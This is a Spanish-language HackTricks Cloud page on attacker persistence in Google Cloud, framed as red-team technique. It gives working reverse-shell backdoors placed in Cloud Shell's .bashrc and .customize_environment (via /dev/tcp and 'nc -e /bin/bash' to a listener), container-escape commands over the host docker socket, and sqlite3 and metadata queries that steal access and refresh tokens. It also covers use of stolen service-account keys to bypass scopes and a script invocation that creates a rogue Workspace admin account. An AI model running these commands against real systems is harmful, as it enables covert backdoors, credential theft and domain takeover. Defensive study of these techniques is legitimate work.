# GCP - Persistencia No-svc

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Estas son t√©cnicas √∫tiles una vez que, de alguna manera, has comprometido algunas credenciales de GCP o una m√°quina que se ejecuta en un entorno de GCP.

## Google‚Äôs Cloud Shell <a href="#e5eb" id="e5eb"></a>

### Puerta Trasera Persistente

[**Google Cloud Shell**](https://cloud.google.com/shell/) te proporciona acceso a la l√≠nea de comandos a tus recursos en la nube directamente desde tu navegador sin ning√∫n costo asociado.

Puedes acceder a Google's Cloud Shell desde la **consola web** o ejecutando **`gcloud cloud-shell ssh`**.

Esta consola tiene algunas capacidades interesantes para atacantes:

1. **Cualquier usuario de Google con acceso a Google Cloud** tiene acceso a una instancia de Cloud Shell completamente autenticada.
2. Dicha instancia **mantendr√° su directorio home durante al menos 120 d√≠as** si no hay actividad.
3. No hay **capacidades para que una organizaci√≥n monitoree** la actividad de esa instancia.

Esto b√°sicamente significa que un atacante puede colocar una puerta trasera en el directorio home del usuario y mientras el usuario se conecte al GC Shell cada 120 d√≠as al menos, la puerta trasera sobrevivir√° y el atacante obtendr√° una shell cada vez que se ejecute simplemente haciendo:
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
Hay otro archivo en la carpeta de inicio llamado **`.customize_environment`** que, si existe, se **ejecutar√° cada vez** que el usuario acceda al **cloud shell** (como en la t√©cnica anterior). Simplemente inserte el backdoor anterior o uno como el siguiente para mantener la persistencia mientras el usuario use "frecuentemente" el cloud shell:
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
Tenga en cuenta que **la primera vez que se realiza una acci√≥n en Cloud Shell que requiere autenticaci√≥n**, aparece una ventana de autorizaci√≥n en el navegador del usuario que debe ser aceptada antes de que se ejecute el comando. Si aparece una ventana emergente inesperada, el objetivo podr√≠a sospechar y eliminar el m√©todo de persistencia.
{% endhint %}

### Escape del Contenedor de Google Cloud Shell

Tenga en cuenta que Google Cloud Shell se ejecuta dentro de un contenedor, puede **escapar f√°cilmente al host** haciendo lo siguiente:
```bash
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name escaper -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start escaper
sudo docker -H unix:///google/host/var/run/docker.sock exec -it escaper /bin/sh
```
Esto no se considera una vulnerabilidad por parte de Google, pero te brinda una visi√≥n m√°s amplia de lo que est√° sucediendo en ese entorno.

Adem√°s, observa que desde el host puedes encontrar un token de cuenta de servicio:
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
default/
vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/
```
Con los siguientes alcances:
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/scopes"
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```
## Secuestro de Tokens

### Usuario Autenticado

Si logras acceder al directorio principal de un **usuario autenticado en GCP**, por **defecto**, podr√°s **obtener tokens para ese usuario todo el tiempo que desees** sin necesidad de autenticarte y sin importar la m√°quina desde la que uses sus tokens e incluso si el usuario tiene MFA configurado.

Esto se debe a que por defecto **podr√°s usar el token de actualizaci√≥n tanto tiempo como desees** para generar nuevos tokens.

Para obtener el token actual de un usuario puedes ejecutar:
```bash
sqlite3 ./.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
```
gcloud auth print-access-token
```
{% endcode %}

Para obtener los detalles para generar un nuevo token de acceso, ejecute:

{% code overflow="wrap" %}
```
```bash
sqlite3 ./.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
```plaintext
Para obtener un nuevo token de acceso actualizado con el token de actualizaci√≥n, ID de cliente y secreto de cliente, ejecute:
```
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
### Cuentas de Servicio

Al igual que con los usuarios autenticados, si logras **comprometer el archivo de clave privada** de una cuenta de servicio podr√°s **acceder a ella generalmente todo el tiempo que desees**.\
Sin embargo, si robas el **token OAuth** de una cuenta de servicio esto puede ser a√∫n m√°s interesante, porque, aunque por defecto estos tokens son √∫tiles solo por una hora, si la **v√≠ctima elimina la clave privada de la API, el token OAuth seguir√° siendo v√°lido hasta que expire**.

### Metadatos

Obviamente, mientras est√©s dentro de una m√°quina que se ejecuta en el entorno de GCP podr√°s **acceder a la cuenta de servicio asociada a esa m√°quina contactando el punto final de metadatos** (ten en cuenta que los tokens OAuth a los que puedes acceder en este punto final suelen estar restringidos por √°mbitos).

### Remedios

Algunos remedios para estas t√©cnicas se explican en [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)

## Eludiendo √°mbitos de acceso <a href="#bypassing-access-scopes" id="bypassing-access-scopes"></a>

Cuando se utilizan [√°mbitos de acceso](https://cloud.google.com/compute/docs/access/service-accounts#accesscopesiam), el token OAuth que se genera para la instancia de c√≥mputo (VM) **tendr√° una** [**limitaci√≥n de √°mbito**](https://oauth.net/2/scope/) **incluida**. Sin embargo, podr√≠as ser capaz de **eludir** esta limitaci√≥n y explotar los permisos que tiene la cuenta comprometida.

La **mejor manera de eludir** esta restricci√≥n es encontrar **nuevas credenciales** en el host comprometido, **encontrar la clave del servicio para generar un token OAuth** sin restricci√≥n o **saltar a una VM diferente menos restringida**.

**Explotar otra m√°quina**

Es posible que exista otra m√°quina en el entorno con √°mbitos de acceso menos restrictivos. Si puedes ver la salida de `gcloud compute instances list --quiet --format=json`, busca instancias con el √°mbito espec√≠fico que deseas o el √°mbito **`auth/cloud-platform`** todo incluido.

Tambi√©n estate atento a las instancias que tienen asignada la cuenta de servicio predeterminada (`PROJECT_NUMBER-compute@developer.gserviceaccount.com`).

**Buscar claves de cuentas de servicio**

Google declara muy claramente [**"Los √°mbitos de acceso no son un mecanismo de seguridad... no tienen efecto al hacer solicitudes que no est√©n autenticadas a trav√©s de OAuth"**](https://cloud.google.com/compute/docs/access/service-accounts#accesscopesiam).

Por lo tanto, si **encuentras una** [**clave de cuenta de servicio**](https://cloud.google.com/iam/docs/creating-managing-service-account-keys) almacenada en la instancia, puedes eludir la limitaci√≥n. Estas son **claves privadas RSA** que se pueden utilizar para autenticarse en la API de Google Cloud y **solicitar un nuevo token OAuth sin limitaciones de √°mbito**.

Comprueba si alguna cuenta de servicio ha exportado una clave en alg√∫n momento con:
```bash
for i in $(gcloud iam service-accounts list --format="table[no-heading](email)"); do
echo "Looking for keys for $i:"
gcloud iam service-accounts keys list --iam-account $i
done
```
Estos archivos **no se almacenan en una Instancia de Compute por defecto**, por lo que tendr√≠as que tener suerte para encontrarlos. El nombre predeterminado para el archivo es `[project-id]-[portion-of-key-id].json`. Entonces, si el nombre de tu proyecto es `test-project`, puedes **buscar en el sistema de archivos `test-project*.json`** en busca de este archivo de clave.

El contenido del archivo se ve algo as√≠:
```json
{
"type": "service_account",
"project_id": "[PROJECT-ID]",
"private_key_id": "[KEY-ID]",
"private_key": "-----BEGIN PRIVATE KEY-----\n[PRIVATE-KEY]\n-----END PRIVATE KEY-----\n",
"client_email": "[SERVICE-ACCOUNT-EMAIL]",
"client_id": "[CLIENT-ID]",
"auth_uri": "https://accounts.google.com/o/oauth2/auth",
"token_uri": "https://accounts.google.com/o/oauth2/token",
"auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
"client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/[SERVICE-ACCOUNT-EMAIL]"
}
```
O, si se **generan desde la CLI**, se ver√°n as√≠:
```json
{
"name": "projects/[PROJECT-ID]/serviceAccounts/[SERVICE-ACCOUNT-EMAIL]/keys/[KEY-ID]",
"privateKeyType": "TYPE_GOOGLE_CREDENTIALS_FILE",
"privateKeyData": "[PRIVATE-KEY]",
"validAfterTime": "[DATE]",
"validBeforeTime": "[DATE]",
"keyAlgorithm": "KEY_ALG_RSA_2048"
}
```
Si encuentras uno de estos archivos, puedes indicar al **`gcloud` command to re-authenticate** con esta cuenta de servicio. Puedes hacer esto en la instancia, o en cualquier m√°quina que tenga las herramientas instaladas.
```bash
gcloud auth activate-service-account --key-file [FILE]
```
Ahora puedes **probar tu nuevo token OAuth** de la siguiente manera:
```bash
TOKEN=`gcloud auth print-access-token`
curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$TOKEN
```
Deber√≠as ver `https://www.googleapis.com/auth/cloud-platform` listado en los alcances, lo que significa que **no est√°s limitado por ning√∫n alcance de acceso a nivel de instancia**. Ahora tienes pleno poder para usar todos tus permisos IAM asignados.

## Propagaci√≥n a Workspace mediante la delegaci√≥n de autoridad a nivel de dominio <a href="#spreading-to-g-suite-via-domain-wide-delegation-of-authority" id="spreading-to-g-suite-via-domain-wide-delegation-of-authority"></a>

[**Workspace**](https://gsuite.google.com) es la **plataforma de colaboraci√≥n y productividad** de Google que consta de cosas como Gmail, Google Calendar, Google Drive, Google Docs, etc.

Las **cuentas de servicio** en GCP pueden recibir los **derechos para acceder program√°ticamente a los datos de los usuarios** en Workspace suplantando a usuarios leg√≠timos. Esto se conoce como [delegaci√≥n a nivel de dominio](https://developers.google.com/admin-sdk/reports/v1/guides/delegation). Esto incluye acciones como **leer** **correo electr√≥nico** en Gmail, acceder a Google Docs e incluso crear nuevas cuentas de usuario en la organizaci√≥n de G Suite.

Workspace tiene [su propia API](https://developers.google.com/gsuite/aspects/apis), completamente separada de GCP. Los permisos se otorgan a Workspace y **no hay ninguna relaci√≥n predeterminada entre GCP y Workspace**.

Sin embargo, es posible **darle** a una cuenta de servicio **permisos** sobre un usuario de Workspace. Si tienes acceso a la interfaz web en este punto, puedes navegar a **IAM -> Cuentas de servicio** y ver si alguna de las cuentas tiene **"Habilitado" listado bajo la columna "delegaci√≥n a nivel de dominio"**. La columna en s√≠ **puede no aparecer si no hay cuentas habilitadas** (puedes leer los detalles de cada cuenta de servicio para confirmar esto). Hasta la fecha de este documento, no hay forma de hacer esto program√°ticamente, aunque hay una [solicitud para esta caracter√≠stica](https://issuetracker.google.com/issues/116182848) en el rastreador de errores de Google.

Para crear esta relaci√≥n es necesario **habilitarlo en GCP y tambi√©n en Workforce**.

#### Probar el acceso a Workspace

Para probar este acceso necesitar√°s las **credenciales de la cuenta de servicio exportadas en formato JSON**. Puede que hayas adquirido estas en un paso anterior, o puede que ahora tengas el acceso necesario para crear una clave para una cuenta de servicio que sepas que tiene habilitada la delegaci√≥n a nivel de dominio.

Este tema es un poco complicado... tu cuenta de servicio tiene algo llamado "client\_email" que puedes ver en el archivo de credenciales JSON que exportas. Probablemente se vea algo como `account-name@project-name.iam.gserviceaccount.com`. Si intentas acceder a las llamadas de la API de Workforce directamente con ese correo electr√≥nico, incluso con la delegaci√≥n habilitada, fallar√°s. Esto se debe a que el directorio de Workforce no incluir√° las direcciones de correo electr√≥nico de la cuenta de servicio de GCP. En cambio, para interactuar con Workforce, necesitamos suplantar a usuarios v√°lidos de Workforce.

Lo que realmente quieres hacer es **suplantar a un usuario con acceso administrativo**, y luego usar ese acceso para hacer algo como **restablecer una contrase√±a, deshabilitar la autenticaci√≥n multifactor o simplemente crearte una nueva cuenta de administrador**.

Gitlab ha creado [este script de Python](https://gitlab.com/gitlab-com/gl-security/gl-redteam/gcp\_misc/blob/master/gcp\_delegation.py) que puede hacer dos cosas: listar el directorio de usuarios y crear una nueva cuenta administrativa. As√≠ es como lo usar√≠as:
```bash
# Validate access only
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com

# List the directory
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com \
--list

# Create a new admin account
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com \
--account pwned
```
Puede probar este script en un rango de direcciones de correo electr√≥nico para suplantar a **varios** **usuarios**. La salida est√°ndar indicar√° si la cuenta de servicio tiene acceso a Workforce e incluir√° una **contrase√±a aleatoria para la nueva cuenta de administrador** si se crea una.

Si tiene √©xito creando una nueva cuenta de administrador, puede iniciar sesi√≥n en la [consola de administraci√≥n de Google](https://admin.google.com) y tener control total sobre todo en G Suite para cada usuario: correo electr√≥nico, documentos, calendario, etc. Disfrute.

## Referencias

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

<details>

<summary><strong>Aprenda hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si desea ver su **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulte los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obtenga el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önase al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠game** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparta sus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
